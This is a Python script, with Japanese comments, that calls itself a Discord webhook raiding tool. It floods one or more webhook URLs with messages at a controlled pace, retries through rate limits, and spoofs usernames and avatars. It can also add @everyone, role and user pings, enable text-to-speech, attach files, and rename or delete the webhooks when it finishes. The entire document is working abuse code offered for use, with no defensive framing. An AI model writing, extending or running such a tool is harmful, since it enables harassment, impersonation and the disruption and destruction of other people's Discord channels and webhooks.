#!/usr/bin/env python3
"""
whook.py - Discord Webhook 荒らしツール (asyncio / レート制限対応)

  python whook.py -w URL -c 500 --content "@everyone {i} {rand}"
  python whook.py -w URL1 URL2 URL3 -c 2000 --content "{line}" --text-file lines.txt
  python whook.py -w URL --duration 60 --embed --embed-title "{rand}" --image https://picsum.photos/900
  python whook.py -w URL -c 50 --attach troll.png --username "System" --delete-webhook

  pip install aiohttp
"""
from __future__ import annotations

import argparse
import asyncio
import json
import random
import string
import sys
import time
from pathlib import Path

import aiohttp

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) whook/1.0"


def rnd(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Discord Webhook 荒らしツール")
    src = p.add_argument_group("対象")
    src.add_argument("-w", "--webhook", nargs="+", default=[], help="Webhook URL (複数可)")
    src.add_argument("-W", "--webhook-file", help="URL を1行1本で並べたファイル")
    src.add_argument("--rename", help="Webhook 自体の名前を変更する")

    lim = p.add_argument_group("量")
    lim.add_argument("-c", "--count", type=int, default=0, help="総投稿数 (0=無制限)")
    lim.add_argument("-t", "--duration", type=float, default=0, help="秒数で打ち切り")
    lim.add_argument("--delay", type=float, default=0.34, help="1送信あたりの待機秒")
    lim.add_argument("--jitter", type=float, default=0.15, help="待機のランダム幅")
    lim.add_argument("--concurrency", type=int, default=1, help="Webhook 1本あたりの並列数")
    lim.add_argument("--retries", type=int, default=6, help="429/5xx 時の再試行回数")
    lim.add_argument("--timeout", type=float, default=15.0, help="HTTP タイムアウト秒")

    body = p.add_argument_group("本文")
    body.add_argument("--content", default="{i}", help="本文。{i}{rand}{time}{hook}{line} が使える")
    body.add_argument("--text-file", help="1行1メッセージのファイル。{line} でランダム/巡回参照")
    body.add_argument("--shuffle", action="store_true", help="text-file をランダム順で使う")
    body.add_argument("--username", help="表示名を偽装")
    body.add_argument("--avatar", help="アイコン URL を偽装")
    body.add_argument("--tts", action="store_true", help="TTS で読み上げさせる")
    body.add_argument("--ping", nargs="+", default=[],
                      help="everyone here role:ID user:ID を本文先頭に付ける")
    body.add_argument("--attach", help="全メッセージに同じファイルを添付")

    emb = p.add_argument_group("埋め込み")
    emb.add_argument("--embed", action="store_true", help="埋め込みで送る")
    emb.add_argument("--embed-title", default="{rand}")
    emb.add_argument("--embed-desc", default="{i}")
    emb.add_argument("--embed-color", type=int, default=0x5865F2)
    emb.add_argument("--image", help="埋め込み画像 URL")
    emb.add_argument("--thumbnail", help="サムネイル URL")

    p.add_argument("--delete-webhook", action="store_true", help="終了時に Webhook を削除")
    p.add_argument("--dry-run", action="store_true", help="1件だけ組み立てて表示")
    return p.parse_args()


class Raider:
    def __init__(self, hooks: list[str], args: argparse.Namespace):
        self.hooks = hooks
        self.a = args
        self.session: aiohttp.ClientSession | None = None
        self.sent = 0
        self.claimed = 0
        self.failed = 0
        self.stop = asyncio.Event()
        self.lock = asyncio.Lock()
        self.t0 = time.time()
        self.attach: tuple[bytes, str] | None = None
        self.lines: list[str] = []
        self.idx = 0

    # ---------- 準備 ----------
    def load_assets(self) -> None:
        if self.a.attach:
            p = Path(self.a.attach)
            self.attach = (p.read_bytes(), p.name)
        if self.a.text_file:
            self.lines = [l.rstrip("\n") for l in
                          Path(self.a.text_file).read_text(encoding="utf-8").splitlines() if l.strip()]
            if self.a.shuffle:
                random.shuffle(self.lines)

    def next_line(self) -> str:
        if not self.lines:
            return ""
        if self.a.shuffle:
            return random.choice(self.lines)
        line = self.lines[self.idx % len(self.lines)]
        self.idx += 1
        return line

    def expand(self, s: str, n: int) -> str:
        return (s.replace("{i}", str(n))
                 .replace("{rand}", rnd())
                 .replace("{time}", time.strftime("%H:%M:%S"))
                 .replace("{hook}", rnd(6))
                 .replace("{line}", self.next_line()))

    def build_payload(self, n: int) -> dict:
        a = self.a
        parts = []
        for ping in a.ping:
            if ping in ("everyone", "here"):
                parts.append("@" + ping)
            elif ping.startswith("role:"):
                parts.append(f"<@&{ping[5:]}>")
            elif ping.startswith("user:"):
                parts.append(f"<@{ping[5:]}>")
        body = " ".join(parts + [self.expand(a.content, n)]).strip()

        payload: dict = {"content": body[:2000]}
        if a.username:
            payload["username"] = self.expand(a.username, n)[:80]
        if a.avatar:
            payload["avatar_url"] = a.avatar
        if a.tts:
            payload["tts"] = True
        if parts:
            payload["allowed_mentions"] = {"parse": ["everyone", "roles", "users"]}
        if a.embed:
            embed = {
                "title": self.expand(a.embed_title, n)[:256],
                "description": self.expand(a.embed_desc, n)[:4000],
                "color": a.embed_color,
            }
            if a.image:
                embed["image"] = {"url": a.image}
            if a.thumbnail:
                embed["thumbnail"] = {"url": a.thumbnail}
            payload["embeds"] = [embed]
        return payload

    # ---------- 送信 ----------
    async def post(self, hook: str, payload: dict):
        if self.attach:
            form = aiohttp.FormData()
            form.add_field("payload_json", json.dumps(payload), content_type="application/json")
            form.add_field("files[0]", self.attach[0],
                           filename=self.attach[1], content_type="application/octet-stream")
            return self.session.post(hook, data=form)
        return self.session.post(hook, json=payload)

    async def send(self, hook: str, n: int) -> None:
        payload = self.build_payload(n)
        for attempt in range(self.a.retries + 1):
            if self.stop.is_set():
                return
            try:
                async with await self.post(hook, payload) as r:
                    if r.status in (200, 204):
                        async with self.lock:
                            self.sent += 1
                        return
                    if r.status == 429:
                        try:
                            wait = float((await r.json(content_type=None)).get("retry_after", 1))
                        except Exception:
                            wait = float(r.headers.get("Retry-After", 1))
                        await asyncio.sleep(min(wait, 30) + random.uniform(0.02, 0.2))
                        continue
                    if r.status == 404:
                        print(f"  [404] Webhook 消失: {hook[-12:]}")
                        return
                    if r.status in (401, 403):
                        print(f"  [{r.status}] 無効な Webhook: {hook[-12:]}")
                        return
                    if r.status >= 500:
                        await asyncio.sleep(1.5 * (attempt + 1))
                        continue
                    print(f"  [{r.status}] {(await r.text())[:180]}")
                    await asyncio.sleep(0.6)
            except (aiohttp.ClientError, asyncio.TimeoutError):
                await asyncio.sleep(1.0 + attempt)
        async with self.lock:
            self.failed += 1

    async def worker(self, hook: str) -> None:
        while not self.stop.is_set():
            async with self.lock:
                if self.a.count and self.claimed >= self.a.count:
                    self.stop.set()
                    return
                self.claimed += 1
                n = self.claimed
            await self.send(hook, n)
            await asyncio.sleep(max(0.0, self.a.delay + random.uniform(0, self.a.jitter)))

    # ---------- 制御 ----------
    async def reporter(self) -> None:
        while not self.stop.is_set():
            await asyncio.sleep(5)
            el = time.time() - self.t0
            print(f"  ... 送信 {self.sent} / 失敗 {self.failed} / {el:.0f}s "
                  f"({self.sent / el:.1f} msg/s)")

    async def run(self) -> None:
        if self.a.duration:
            async def killer():
                await asyncio.sleep(self.a.duration)
                self.stop.set()
            asyncio.create_task(killer())

        timeout = aiohttp.ClientTimeout(total=self.a.timeout)
        async with aiohttp.ClientSession(timeout=timeout,
                                         headers={"User-Agent": UA}) as sess:
            self.session = sess

            if self.a.rename:
                for h in self.hooks:
                    try:
                        async with sess.patch(h, json={"name": self.a.rename}) as r:
                            print(f"rename -> {r.status}")
                    except Exception as e:
                        print(f"rename 失敗: {e}")

            tasks = [asyncio.create_task(self.worker(h))
                     for h in self.hooks for _ in range(max(1, self.a.concurrency))]
            rep = asyncio.create_task(self.reporter())
            try:
                await asyncio.gather(*tasks)
            except asyncio.CancelledError:
                pass
            self.stop.set()
            rep.cancel()

            if self.a.delete_webhook:
                for h in self.hooks:
                    try:
                        async with sess.delete(h) as r:
                            print(f"delete -> {r.status}")
                    except Exception as e:
                        print(f"delete 失敗: {e}")


def main() -> None:
    a = parse_args()

    hooks: list[str] = []
    for h in a.webhook:
        hooks += [x.strip() for x in h.split(",") if x.strip()]
    if a.webhook_file:
        hooks += [l.strip() for l in Path(a.webhook_file).read_text(encoding="utf-8").splitlines() if l.strip()]
    hooks = list(dict.fromkeys(h for h in hooks if "webhooks/" in h))
    if not hooks:
        sys.exit("Webhook URL を -w か -W で指定してください")

    r = Raider(hooks, a)
    r.load_assets()

    if a.dry_run:
        print(json.dumps(r.build_payload(1), ensure_ascii=False, indent=2))
        return

    print(f"対象 {len(hooks)} 本 / 並列 {a.concurrency} / "
          f"上限 {a.count or ('時間 ' + str(a.duration) + 's')}")
    t = time.time()
    try:
        asyncio.run(r.run())
    except KeyboardInterrupt:
        pass
    el = time.time() - t
    print(f"\n完了: 送信 {r.sent} / 失敗 {r.failed} / {el:.1f}s ({r.sent / max(el, .001):.1f} msg/s)")


if __name__ == "__main__":
    main()